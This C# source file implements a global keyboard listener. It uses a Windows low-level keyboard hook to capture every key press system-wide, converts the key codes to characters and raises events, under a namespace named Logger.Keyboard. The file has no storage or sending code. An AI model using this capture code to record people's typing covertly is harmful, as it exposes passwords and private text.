using System;
using System.Diagnostics;
using System.Windows.Input;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace Logger.Keyboard
{
    /// <summary>
    /// Listens keyboard globally.
    /// 
    /// <remarks>Uses WH_KEYBOARD_LL.</remarks>
    /// </summary>
    class KeyboardListener : IDisposable
    {
        /// <summary>
        /// Creates global keyboard listener.
        /// </summary>
        public KeyboardListener()
        {          
            // We have to store the LowLevelKeyboardProc, so that it is not garbage collected runtime
            hookedLowLevelKeyboardProc = (WinAPI.LowLevelKeyboardProc)LowLevelKeyboardProc;
 
            // Set the hook
            hookId = WinAPI.SetHook(hookedLowLevelKeyboardProc);
 
            // Assign the asynchronous callback event
            hookedKeyboardCallbackAsync = new KeyboardCallbackAsync(KeyboardListener_KeyboardCallbackAsync);
        }
 
        /// <summary>
        /// Destroys global keyboard listener.
        /// </summary>
        ~KeyboardListener()
        {
            Dispose();
        }
 
        /// <summary>
        /// Fired when any of the keys is pressed down.
        /// </summary>
        public event RawKeyEventHandler KeyDown;
 
        /// <summary>
        /// Fired when any of the keys is released.
        /// </summary>
        public event RawKeyEventHandler KeyUp;
 
        #region Inner workings
 
        /// <summary>
        /// Hook ID
        /// </summary>
        private IntPtr hookId = IntPtr.Zero;
 
        /// <summary>
        /// Asynchronous callback hook.
        /// </summary>
        /// <param name="character">Character</param>
        /// <param name="keyEvent">Keyboard event</param>
        /// <param name="vkCode">VKCode</param>
        private delegate void KeyboardCallbackAsync(WinAPI.KeyEvent keyEvent, int vkCode, string character);
 
        /// <summary>
        /// Actual callback hook.
        /// 
        /// <remarks>Calls asynchronously the asyncCallback.</remarks>
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        [MethodImpl(MethodImplOptions.NoInlining)]
        private IntPtr LowLevelKeyboardProc(int nCode, UIntPtr wParam, IntPtr lParam)
        {
            string chars = "";
 
            if (nCode >= 0)
                if (wParam.ToUInt32() == (int)WinAPI.KeyEvent.WM_KEYDOWN ||
                    wParam.ToUInt32() == (int)WinAPI.KeyEvent.WM_KEYUP ||
                    wParam.ToUInt32() == (int)WinAPI.KeyEvent.WM_SYSKEYDOWN ||
                    wParam.ToUInt32() == (int)WinAPI.KeyEvent.WM_SYSKEYUP)
                {
                    // Captures the character(s) pressed only on WM_KEYDOWN
                    chars = WinAPI.VKCodeToString((uint)Marshal.ReadInt32(lParam), 
                        (wParam.ToUInt32() == (int)WinAPI.KeyEvent.WM_KEYDOWN ||
                        wParam.ToUInt32() == (int)WinAPI.KeyEvent.WM_SYSKEYDOWN));
 
                    hookedKeyboardCallbackAsync.BeginInvoke((WinAPI.KeyEvent)wParam.ToUInt32(), Marshal.ReadInt32(lParam), chars, null, null);
                }
            
            return WinAPI.CallNextHookEx(hookId, nCode, wParam, lParam);
        }
 
        /// <summary>
        /// Event to be invoked asynchronously (BeginInvoke) each time key is pressed.
        /// </summary>
        private KeyboardCallbackAsync hookedKeyboardCallbackAsync;
 
        /// <summary>
        /// Contains the hooked callback in runtime.
        /// </summary>
        private WinAPI.LowLevelKeyboardProc hookedLowLevelKeyboardProc;
 
        /// <summary>
        /// HookCallbackAsync procedure that calls accordingly the KeyDown or KeyUp events.
        /// </summary>
        /// <param name="keyEvent">Keyboard event</param>
        /// <param name="vkCode">VKCode</param>
        /// <param name="character">Character as string.</param>
        void KeyboardListener_KeyboardCallbackAsync(WinAPI.KeyEvent keyEvent, int vkCode, string character)
        {
            switch (keyEvent)
            {
                // KeyDown events
                case WinAPI.KeyEvent.WM_KEYDOWN:
                    if (KeyDown != null)
                        KeyDown.BeginInvoke(this, new RawKeyEventArgs(vkCode, false, character), null, null);
                    break;
                case WinAPI.KeyEvent.WM_SYSKEYDOWN:
                    if (KeyDown != null)
                        KeyDown.BeginInvoke(this, new RawKeyEventArgs(vkCode, true, character), null, null);
                    break;
 
                // KeyUp events
                case WinAPI.KeyEvent.WM_KEYUP:
                    if (KeyUp != null)
                        KeyUp.BeginInvoke(this, new RawKeyEventArgs(vkCode, false, character), null, null);
                    break;
                case WinAPI.KeyEvent.WM_SYSKEYUP:
                    if (KeyUp != null)
                        KeyUp.BeginInvoke(this, new RawKeyEventArgs(vkCode, true, character), null, null);
                    break;
 
                default:
                    break;
            }
        }
 
        #endregion
 
        #region IDisposable Members
 
        /// <summary>
        /// Disposes the hook.
        /// <remarks>This call is required as it calls the UnhookWindowsHookEx.</remarks>
        /// </summary>
        public void Dispose()
        {
            WinAPI.UnhookWindowsHookEx(hookId);
        }
 
        #endregion
    }
 
    /// <summary>
    /// Raw KeyEvent arguments.
    /// </summary>
    class RawKeyEventArgs : EventArgs
    {
        /// <summary>
        /// VKCode of the key.
        /// </summary>
        public int VKCode;
 
        /// <summary>
        /// WPF Key of the key.
        /// </summary>
        public Key Key;
 
        /// <summary>
        /// Is the hitted key system key.
        /// </summary>
        public bool IsSysKey;
 
        /// <summary>
        /// Convert to string.
        /// </summary>
        /// <returns>Returns string representation of this key, if not possible empty string is returned.</returns>
        public override string ToString()
        {
            return Character;
        }
 
        /// <summary>
        /// Unicode character of key pressed.
        /// </summary>
        public string Character;
 
        /// <summary>
        /// Create raw keyevent arguments.
        /// </summary>
        /// <param name="VKCode"></param>
        /// <param name="isSysKey"></param>
        /// <param name="Character">Character</param>
        public RawKeyEventArgs(int VKCode, bool isSysKey, string Character)
        {
            this.VKCode = VKCode;
            this.IsSysKey = isSysKey;
            this.Character = Character;
            this.Key = System.Windows.Input.KeyInterop.KeyFromVirtualKey(VKCode);
        }
 
    }
 
    /// <summary>
    /// Raw keyevent handler.
    /// </summary>
    /// <param name="sender">sender</param>
    /// <param name="args">raw keyevent arguments</param>
    delegate void RawKeyEventHandler(object sender, RawKeyEventArgs args);
}


